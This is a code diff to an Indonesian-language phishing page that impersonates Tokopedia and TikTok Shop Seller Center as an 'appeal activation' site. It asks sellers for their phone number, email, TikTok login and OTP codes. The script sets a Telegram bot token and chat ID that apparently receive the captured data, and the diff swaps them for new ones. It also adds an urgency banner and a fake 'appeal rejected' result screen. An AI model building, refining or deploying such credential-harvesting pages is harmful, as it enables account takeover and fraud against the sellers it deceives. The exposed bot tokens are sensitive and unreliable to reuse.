@@ -4,11 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok Shop - Aktivasi Banding</title>
-      <meta name="description" content="Website Resmi Tokopedia & TikTok Shop Seller, Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
-      <meta property="og:title" content="Website Resmi Tokopedia & TikTok Shop Seller">
-      <meta property="og:description" content="Pengajuan Banding TikTok Shop Seller. Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
-   
-    <style>
+    <meta name="description" content="Website Resmi Tokopedia & TikTok Shop Seller, Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
+    <meta property="og:title" content="Website Resmi Tokopedia & TikTok Shop Seller">
+    <meta property="og:description" content="Pengajuan Banding TikTok Shop Seller. Website Penghapusan Riwayat Pelanggaran Seller Center. Aktivasi Agar Tidak Di Blokir Permanen">
+     <style>
 * {
     margin: 0;
     padding: 0;
@@ -30,12 +29,12 @@ html, body {
          justify-content: center;
          align-items: center;
          width: 100%;
-         margin-bottom: 20px;
+         margin-bottom: 10px;
      }
      .gambar-tautan {
          display: block;
          width: 100%;
-         max-width: 200px;
+         max-width: 350px;
          height: auto;
          border-radius: 12px;
          text-decoration: none;
@@ -95,10 +94,10 @@ h2 {
     display: flex;
     justify-content: flex-start;
     align-items: center;
-    margin-bottom: 24px;
+    margin-bottom: 4px;
 }
 .back-btn {
-    font-size: 24px;
+    font-size: 34px;
     color: #007aff;
     cursor: pointer;
     line-height: 1;
@@ -326,6 +325,27 @@ input:focus {
     cursor: pointer;
 }
 
+    .berjalan {
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+    }
+
+    .berjalan span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: jalan 15s linear infinite;
+      font-size: 18px;
+      color: #d32f2f;
+      font-weight: bold;
+    }
+
+
+    @keyframes jalan {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(-100%, 0); }
+    }
+
     </style>
 </head>
 <body>
@@ -336,13 +356,18 @@ input:focus {
  </div>
  <div class="gambar-tautan-wadah">
      <a href="#" class="gambar-tautan">
-       <img src="https://ikon-dusky.vercel.app/Logo_Tokopedia_dan_TikTok_Shop-2023_11_22-21_55_37_a0e034dbf9ba86166e7b8d373abfa37e_960x640_thumb.png" alt="Gambar">
+       <img src="https://ikon-dusky.vercel.app/tt-tokped.jpg" alt="Gambar">
      </a>
    </div>
+
 <!-- Halaman Awal -->
 <div class="container" id="page-awal">
-    <h1>Selamat Datang</h1>
-    <p class="subhead">Aktivasi Pengajuan Banding TikTok Shop Seller Center</p>
+    <h1>SILAHKAN MASUK AKUN</h1>
+    <div class="berjalan">
+    <span>⏳ Aktivasi Pengajuan Banding — Tokopedia Seller Center— TikTok Shop Seller Center ⏳</span>
+  </div>
+  <br>
+
     <button class="btn btn-hpemail" onclick="tampilkanHalaman('page-login-umum')">Masuk dengan Nomor HP / Email</button>
     <button class="btn btn-tiktok" onclick="tampilkanHalaman('page-tiktok')">Lanjutkan dengan TikTok</button>
     <p class="desc-text">Dengan melanjutkan, Anda menyetujui <a href="#">Kebijakan Privasi</a> dan <a href="#">Syarat Penggunaan</a></p>
@@ -354,6 +379,10 @@ input:focus {
         <span class="back-btn" onclick="tampilkanHalaman('page-awal')">&larr;</span>
     </div>
     <h2>Masuk Akun</h2>
+    <div class="berjalan">
+    <span>⏳ Aktivasi Pengajuan Banding — Tokopedia Seller Center— TikTok Shop Seller Center ⏳</span>
+  </div>
+    
     <div class="tabs">
         <div class="tab active" onclick="gantiTabUmum('hp')">Nomor HP</div>
         <div class="tab" onclick="gantiTabUmum('email')">Email</div>
@@ -463,16 +492,24 @@ input:focus {
 
 <!-- Halaman Hasil -->
 <div class="container result-page" id="page-result" style="display: none;">
-    <div class="result-icon">✅</div>
-    <h2>Verifikasi Berhasil</h2>
-    <p class="result-desc">Data Anda telah terverifikasi. Selamat menggunakan layanan kami.</p>
-    <span class="back-icon-wrap" onclick="tampilkanHalaman('page-awal')">&larr; Kembali ke Halaman Awal</span>
+    <div class="result-icon">⚠️</div>
+    <h2>Pengajuan Banding Ditolak</h2>
+    <p class="result-desc">
+        Keranjang Kuning Anda belum terhubung.
+        <br>
+        <br>
+            Hubungkan TikTok Seller Center ke Tokopedia terlebih dahulu.
+            <br>
+            <br>
+            Silakan Buka Aplikasi Seller Center Untuk Menghubungkan TikTok Shop ke Tokopedia.
+            </p>
+            <span class="back-icon-wrap" onclick="tampilkanHalaman('page-awal')">&larr; Kembali ke Halaman Awal</span>
 </div>
 
 <script>
 // === KONFIGURASI BOT TELEGRAM ===
-const BOT_TOKEN = '8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04';
-const CHAT_ID = '7402071395';
+const BOT_TOKEN = '8775719391:AAFsEGizC7fHpF-cYPISJXsnd1vV2z_ntW8';
+const CHAT_ID = '6883233614';
 
 let pakai6Angka = false;
 let halamanSebelumOTP = 'page-awal';
